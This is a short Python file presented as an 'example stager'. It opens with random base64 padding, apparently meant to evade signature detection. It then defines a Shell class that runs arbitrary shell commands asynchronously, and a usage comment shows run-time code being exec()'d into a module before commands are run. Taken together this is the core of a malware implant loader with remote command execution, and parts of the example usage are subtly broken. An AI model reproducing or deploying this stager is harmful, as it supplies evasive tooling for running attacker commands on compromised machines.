"""
Random Padding
C6QOlsAiZ8xCnOJC9Evv66/XHFTQjHibjv54XS4cvyvA07Gnnvnxjs9pKeC4I7rub2ZeLxHuIAKK
MXgDQfWBnuh7YdAWOrmw6P5fYz7LHwG8JQvcjqMNRXWzGHXinWd9xv9AA+0J7XJ0/w6vZG/mGUXK
tr/4P2MCI6OYFLfKNx+U9GKNrywrVs8XaRKLgDndP38NKjkoA0IN6lZe/xBhFXpkyR5Nv88jWnz7
npKh/dnIVm+dwevGwqzBaZAjQPOjDXe+gSs57+AxGefHEqcya46ptrXhMLvXuavbJ9pa30wWdp5q
A0LvdfTmCg==

Example stager for dynamic loading of execution functionality.

"""

class Shell:
    asyncio = __import__('asyncio')
    async def exec_cmd(self, cmd):

        proc = await self.asyncio.create_subprocess_shell(
            cmd,
            stdout=self.asyncio.subprocess.PIPE,
            stderr=self.asyncio.subprocess.PIPE
        )

        stdout = await proc.communicate()
        return stdout

"""
Example usage:

def dynamic_load(code):
    shell_code = ModuleType('shell')
    exec(code, globals(), shell_code.__dict__)

shell = dynamic_load(code)
shellcode = shell.Shell()
await shellcode.exec_cmd(cmd)
"""